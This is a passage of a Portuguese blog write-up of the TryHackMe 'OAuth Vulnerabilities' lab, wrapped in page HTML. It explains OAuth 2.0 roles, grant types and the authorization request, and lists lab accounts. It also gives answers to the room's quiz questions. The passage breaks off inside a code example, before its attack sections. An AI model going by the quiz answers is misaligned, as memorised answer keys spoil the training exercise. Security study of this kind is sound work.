+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#concess%c3%a3o-de-credenciais-de-senha-do-propriet%c3%a1rio-do-recurso">Concessão de credenciais de senha do proprietário do recurso
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#concess%c3%a3o-de-credenciais-do-cliente">Concessão de credenciais do cliente
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#como-funciona-oauth">Como funciona OAuth
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#solicita%c3%a7%c3%a3o-de-autoriza%c3%a7%c3%a3o">Solicitação de autorização
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#autenticando-e-autorizando">Autenticando e autorizando
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#resposta-de-autoriza%c3%a7%c3%a3o">Resposta de autorização
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#token-de-acesso-1">Token de acesso
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#resposta-do-token">Resposta do token
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#identificando-servi%c3%a7os-de-oauth">Identificando serviços de OAuth
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#implementa%c3%a7%c3%b5es-de-oauth">Implementações de OAuth
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#framework-oauth">Framework OAuth
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#roubando-token-oauth">Roubando Token OAuth
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#papel-do-redirect_uri">Papel do Redirect_uri
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#vulnerabilidade">Vulnerabilidade
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#realizando-ataque">Realizando ataque
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#csrf-no-oauth">CSRF no OAuth
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#fraqueza-ou-falta-do-par%c3%a2metro">Fraqueza ou falta do parâmetro
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pr%c3%a1tica">Prática
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#resumo-do-ataque">Resumo do ataque:
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#ataque">Ataque
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#fluxo-de-concess%c3%a3o-impl%c3%adcita">Fluxo de Concessão Implícita
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pr%c3%a1tica-1">Prática
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#outras-vulnerabilidades-e-evolu%c3%a7%c3%a3o-do-oauth-21">Outras Vulnerabilidades e Evolução do OAuth 2.1
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#expira%c3%a7%c3%a3o-de-token-insuficiente">Expiração de Token Insuficiente
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#ataques-de-repeti%c3%a7%c3%a3o">Ataques de Repetição
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#armazenamento-inseguro-de-tokens">Armazenamento Inseguro de Tokens
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#evolu%c3%a7%c3%a3o-do-oauth-21">Evolução do OAuth 2.1
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#conclus%c3%a3o">Conclusão
+        </a>
+      </li></ul>
+      <div class="hx:mt-8 hx:border-t hx:bg-white hx:pt-8 hx:shadow-[0_-12px_16px_white] hx:dark:bg-dark hx:dark:shadow-[0_-12px_16px_#111] hx:sticky hx:bottom-0 hx:flex hx:flex-col hx:items-start hx:gap-2 hx:pb-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-t hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:border-neutral-400">
+        <button id="backToTop" tabindex="-1" class="hx:cursor-pointer hx:transition-all hx:duration-75 hx:opacity-0 hx:text-xs hx:font-medium hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-100 hx:contrast-more:text-gray-800 hx:contrast-more:dark:text-gray-50">
+          <span>Voltar ao topo</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:inline hx:ltr:ml-1 hx:rtl:mr-1 hx:h-3.5 hx:w-3.5 hx:rounded-full hx:border hx:border-gray-500 hx:hover:border-gray-900 hx:dark:border-gray-400 hx:dark:hover:border-gray-100 hx:contrast-more:border-gray-800 hx:contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx:w-full hx:break-words hx:flex hx:min-h-[calc(100vh-var(--hextra-navbar-height))] hx:min-w-0 hx:justify-center hx:pb-8 hx:pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main id="content" class="hx:w-full hx:min-w-0 hextra-max-content-width hx:px-6 hx:pt-4 hx:md:px-12">
+        
+        
+        <br class="hx:mt-1.5 hx:text-sm" />
+        <h1 class="hx:text-center hx:mt-2 hx:text-4xl hx:font-bold hx:tracking-tight hx:text-slate-900 hx:dark:text-slate-100">OAuth Vulnerabilities</h1>
+        <div class="hx:mb-16"></div>
+        <div class="content">
+          
+          <h2 data-hextra-search-id="objetivos">Objetivos<span class="hx:absolute hx:-mt-20" id="objetivos"></span>
+    <a href="#objetivos" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><ol>
+<li>Conceitos essenciais sobre OAuth 2.0.</li>
+<li>O fluxo do OAuth 2.0.</li>
+<li>Identificar serviços de OAuth.</li>
+<li>Explorar técnicas.</li>
+<li>Evolução do OAuth 2.1.</li>
+</ol>
+<p>A aula pode ser encontrada aqui <a
+    href="https://tryhackme.com/r/room/oauthvulnerabilities"target="_blank" rel="noopener">room 0Auth</a>
+Irei documentar a aula e seus exercícios propostos.</p>
+<h2 data-hextra-search-id="conceitos-chaves">Conceitos chaves<span class="hx:absolute hx:-mt-20" id="conceitos-chaves"></span>
+    <a href="#conceitos-chaves" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><h3 data-hextra-search-id="proprietário-do-recurso">Proprietário do recurso<span class="hx:absolute hx:-mt-20" id="proprietário-do-recurso"></span>
+    <a href="#propriet%c3%a1rio-do-recurso" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O proprietário do recursos pode ser uma pessoa ou sistema, que controla um certo tipo de dado e pode autorizar uma aplicação a acessar este dado em seu nome. O conceito fundamental gira em torno do usuário, seu consentimento e controle, por exemplo, você é o proprietário do recurso como um cliente da cafeteria. Você pode controlar as informações da sua conta e conceder permissão ao aplicativo móvel da cafeteria para acessar seus dados.</p>
+<h3 data-hextra-search-id="cliente">Cliente<span class="hx:absolute hx:-mt-20" id="cliente"></span>
+    <a href="#cliente" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O cliente pode ser um aplicativo mobile ou uma aplicação web (<em>server side</em>), desempenha o papel de intermediário, requisitando acesso aos recursos e executando ações com a permissão do proprietário do recurso. Exemplo, o aplicativo ou aplicação web realiza os pagamentos dos pedidos, o proprietário do recurso autoriza o acesso aos detalhes da conta e informações de pagamento.</p>
+<h3 data-hextra-search-id="servidor-de-autorização">Servidor de autorização<span class="hx:absolute hx:-mt-20" id="servidor-de-autorização"></span>
+    <a href="#servidor-de-autoriza%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O servidor de autorização é responsável por emitir tokens de acesso ao cliente após autenticar com sucesso o proprietário do recurso e obter sua autorização.O servidor de autorização desempenha um papel crucial no processo OAuth, garantindo que o cliente receba permissão somente após autenticação e consentimento do usuário legítimo. O servidor de autorização controla as autenticações e autorizações, verifica suas credenciais e concede permissões para aplicação web( ou app mobile) acessar a sua conta.</p>
+<h3 data-hextra-search-id="servidor-de-recurso">Servidor de recurso<span class="hx:absolute hx:-mt-20" id="servidor-de-recurso"></span>
+    <a href="#servidor-de-recurso" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O servidor que hospeda os recursos protegidos pode aceitar e responder a solicitações de recursos protegidos usando tokens de acesso. Este servidor garante que apenas clientes autenticados e autorizados possam acessar ou manipular os dados do proprietário do recurso.</p>
+<h3 data-hextra-search-id="concessão-de-autorização">Concessão de Autorização<span class="hx:absolute hx:-mt-20" id="concessão-de-autorização"></span>
+    <a href="#concess%c3%a3o-de-autoriza%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O cliente usa uma credencial que representa a autorização do proprietário do recurso.
+Os principais tipos de concessão são:</p>
+<ul>
+<li>Authorization Code</li>
+<li>Implicit</li>
+<li>Resource Owner Password Credentials</li>
+<li>Client Credentials</li>
+</ul>
+<h3 data-hextra-search-id="token-de-acesso">Token de acesso<span class="hx:absolute hx:-mt-20" id="token-de-acesso"></span>
+    <a href="#token-de-acesso" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>É uma credencial que o cliente usa para acessar recursos protegidos em nome do proprietário do recurso. Esses tokens possuem uma vida útil. São essenciais para manter a segurança nas comunicações entre o cliente e o servidor de recurso, sem a necessidade de solicitar as credenciais do proprietário do recurso a cada requisição.</p>
+<h3 data-hextra-search-id="token-de-atualização">Token de atualização<span class="hx:absolute hx:-mt-20" id="token-de-atualização"></span>
+    <a href="#token-de-atualiza%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>É uma credencial que o cliente pode usar para obter um novo token de acesso sem exigir que o proprietário do recurso se autentique novamente. Os tokens de atualização geralmente têm uma vida útil longa e fornecem uma maneira de manter sessões de usuário sem interrupções frequentes de login.</p>
+<h3 data-hextra-search-id="redirecionar-uri">Redirecionar URI<span class="hx:absolute hx:-mt-20" id="redirecionar-uri"></span>
+    <a href="#redirecionar-uri" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O URI para o qual o servidor de autorização redirecionará o <em>user-agent</em> do proprietário do recurso após a concessão ou negação da autorização. Ele verifica se o cliente para o qual a resposta de autorização foi solicitada está correto.</p>
+<h3 data-hextra-search-id="escopo">Escopo<span class="hx:absolute hx:-mt-20" id="escopo"></span>
+    <a href="#escopo" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Escopos são um mecanismo para limitar o acesso de um aplicativo à conta de um usuário. Eles permitem que o cliente especifique o nível de acesso necessário e que o servidor de autorização informe ao usuário quais níveis de acesso o aplicativo está solicitando. Escopos ajudam a impor o princípio do menor privilégio.</p>
+<h3 data-hextra-search-id="parâmetro-de-estado">Parâmetro de estado<span class="hx:absolute hx:-mt-20" id="parâmetro-de-estado"></span>
+    <a href="#par%c3%a2metro-de-estado" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Um parâmetro opcional, mantém o estado entre o cliente e o servidor de autorização. Ele pode ajudar a evitar ataques CSRF ao garantir que a resposta corresponda à solicitação do cliente. O parâmetro state é uma parte crucial da proteção do fluxo OAuth.</p>
+<h3 data-hextra-search-id="token-e-endpoint-de-autorização">Token e endpoint de autorização<span class="hx:absolute hx:-mt-20" id="token-e-endpoint-de-autorização"></span>
+    <a href="#token-e-endpoint-de-autoriza%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>O endpoint do servidor de autorização é onde o cliente troca a concessão de autorização (ou token de atualização) por um token de acesso. Em contraste, o endpoint de autorização é onde o proprietário do recurso é autenticado e autoriza o cliente a acessar os recursos protegidos.</p>
+<p><strong>Which (optional) parameter can be used to prevent CSRF attacks?</strong><br>
+Resposta:<code>state</code></p>
+<p><strong>What credentials can the client use to access protected resources on behalf of the resource owner?</strong><br>
+Resposta:<code>Access token</code></p>
+<h2 data-hextra-search-id="tipos-de-concessão-de-oauth">Tipos de concessão de OAuth<span class="hx:absolute hx:-mt-20" id="tipos-de-concessão-de-oauth"></span>
+    <a href="#tipos-de-concess%c3%a3o-de-oauth" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Discutiremos abaixo os principais tipos de concessão que OAuth fornece para diversos tipos de cenários e clientes.</p>
+<h3 data-hextra-search-id="concessão-de-código-de-autorização">Concessão de código de autorização<span class="hx:absolute hx:-mt-20" id="concessão-de-código-de-autorização"></span>
+    <a href="#concess%c3%a3o-de-c%c3%b3digo-de-autoriza%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>É o tipo mais frequente, é mais adequado para aplicações <em>server side</em>, por exemplo: PHP, JAVA, .NET, etc. Nesse cenário, o cliente redireciona o usuário para o servidor de autorização, onde realiza a autenticação e concede autorização. O servidor de autorização redireciona o usuário para o cliente com um código de autorização. Então, o cliente troca esse código por um token e, com esse token, o cliente solicita ao servidor de recurso o <em>endpoint</em> para acesso ao recurso solicitado.</p>
+<p>Esse tipo de concessão aprimora a segurança, garantindo que o token de acesso não será exposto, visto que a troca de código de autorização e token é feita entre os servidores, evitando assim vazamentos</p>
+<h3 data-hextra-search-id="concessão-implícita">Concessão implícita<span class="hx:absolute hx:-mt-20" id="concessão-implícita"></span>
+    <a href="#concess%c3%a3o-impl%c3%adcita" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Principalmente utilizado em aplicativos móveis e aplicações web, onde não ocorre o armazenamento seguro do segredo. Um token de acesso é emitido diretamente para o cliente, sem a necessidade de um código de autorização. Nesse cenário, o cliente redireciona o usuário para o servidor de autorização. Depois de autorizado e a concessão realizada, o servidor de autorização retorna com o token de acesso na URL.</p>
+<p>Esse tipo de concessão realiza menos etapas e é mais rápido, porém, é menos seguro e expõe o token na URL. Além disso, não suporta a atualização do token.</p>
+<h3 data-hextra-search-id="concessão-de-credenciais-de-senha-do-proprietário-do-recurso">Concessão de credenciais de senha do proprietário do recurso<span class="hx:absolute hx:-mt-20" id="concessão-de-credenciais-de-senha-do-proprietário-do-recurso"></span>
+    <a href="#concess%c3%a3o-de-credenciais-de-senha-do-propriet%c3%a1rio-do-recurso" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Correção Gramatical:
+Utilizada quando o usuário possui alta confiança no cliente, as credenciais são enviadas para o cliente, que então envia as credenciais para o servidor de autorização. O servidor de autorização verifica as credenciais e, após isso, emite o token.</p>
+<p>Recomendado somente em cenários onde o usuário confia na aplicação, como em aplicações first party. Este método requer menos interações, mas possui menos segurança.</p>
+<h3 data-hextra-search-id="concessão-de-credenciais-do-cliente">Concessão de credenciais do cliente<span class="hx:absolute hx:-mt-20" id="concessão-de-credenciais-do-cliente"></span>
+    <a href="#concess%c3%a3o-de-credenciais-do-cliente" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Utilizado entre servidores, sem o envolvimento do usuário, são usadas as credenciais do cliente (client ID e um segredo). O cliente interage com o servidor de autorização com essas credenciais, e o servidor emite um token de acesso.</p>
+<p>Utilizado entre servidores e serviços de backend, reduz os riscos de segurança, pois nenhum dado do usuário é exposto.</p>
+<p><strong>What is the grant type often used for server-server interaction?</strong><br>
+Resposta: <code>Client Credentials</code></p>
+<h2 data-hextra-search-id="como-funciona-oauth">Como funciona OAuth<span class="hx:absolute hx:-mt-20" id="como-funciona-oauth"></span>
+    <a href="#como-funciona-oauth" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Para temos uma compreensão melhor do funcionamento como um todo, vamos utilizar a imagem fornecida na aula.</p>
+<p><img src="/assets/img/posts/2025/02/auth/example.png" alt="example"  loading="lazy" /></p>
+<p>No laboratório, iremos nos autenticar no <code>CoffeShopApp</code> usando OAuth com as credenciais fornecidas abaixo:</p>
+<ul>
+<li>
+<p><strong>Victim</strong>: <code>victim:victim123</code></p>
+</li>
+<li>
+<p><strong>Attacker</strong>: <code>attacker:tesla@123</code></p>
+</li>
+</ul>
+<p>O <em>client</em> é <code>http://bistro.thm:8000</code>, onde o usuário pretende logar utilizando suas credenciais da conta do <code>CoffeShopApp</code>. Sendo assim:</p>
+<ul>
+<li>
+<p>Client: <code>http://bistro.thm:8000</code></p>
+</li>
+<li>
+<p>Servidor de autorização: <code>CoffeShopApp</code></p>
+</li>
+</ul>
+<h3 data-hextra-search-id="solicitação-de-autorização">Solicitação de autorização<span class="hx:absolute hx:-mt-20" id="solicitação-de-autorização"></span>
+    <a href="#solicita%c3%a7%c3%a3o-de-autoriza%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Quando acessamos o <code>bistro.thm</code> temos a opção de logar com OAuth.</p>
+<p><img src="/assets/img/posts/2025/02/auth/bistro_auth.png" alt="bistroAuth"  loading="lazy" /></p>
+<p>Quando clicamos no botão somos redirecionados para o servidor de autorização.
+Realizando o <em>decode</em> da URI para melhor visualização:</p>
+<p><code>http://coffee.thm:8000/accounts/login/?next=/o/authorize/?client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt&amp;response_type=code&amp;redirect_uri=http://bistro.thm:8000/oauthdemo/callback</code></p>
+<p><img src="/assets/img/posts/2025/02/auth/coffe_auth.png" alt="coffeAuth"  loading="lazy" /></p>
+<p>Os campos da URI são:</p>
+<ul>
+<li>
+<p><code>response_type=code</code>: Indica que o <code>CoffeShopApp</code> está esperando o código de autorização.</p>
+</li>
+<li>
+<p><code>state</code>: Um token CSRF, garante que a requisição e a resposta são parte da mesma transação.</p>
+</li>
+<li>
+<p><code>client_id</code>: Identificador público, identifica a aplicação cliente.</p>
+</li>
+<li>
+<p><code>redirect_uri</code>: A URL para onde o servidor de autorização enviará o usuário depois que ele conceder permissão.</p>
+</li>
+<li>
+<p><code>scope</code>: Especifica o nível de acesso.</p>
+</li>
+</ul>
+<p>Com essas informações, que serão passadas pelo <code>bistro app</code>, o servidor de autorização entenderá a requisição e para onde deve redirecionar o usuário após as verificações. Exemplo de um código Python fornecido na aula.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">oauth_login</span>(request): 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	app <span style="color:#f92672">=</span> Application<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>get(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;CoffeeApp&#34;</span>) 
+</span></span><span style="display:flex;"><span>	redirect_uri <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>GET<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;redirect_uri&#34;</span>, <span style="color:#e6db74">&#34;http://bistro.thm:8000/oauthdemo/callback&#34;</span>) 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	authorization_url <span style="color:#f92672">=</span> ( 
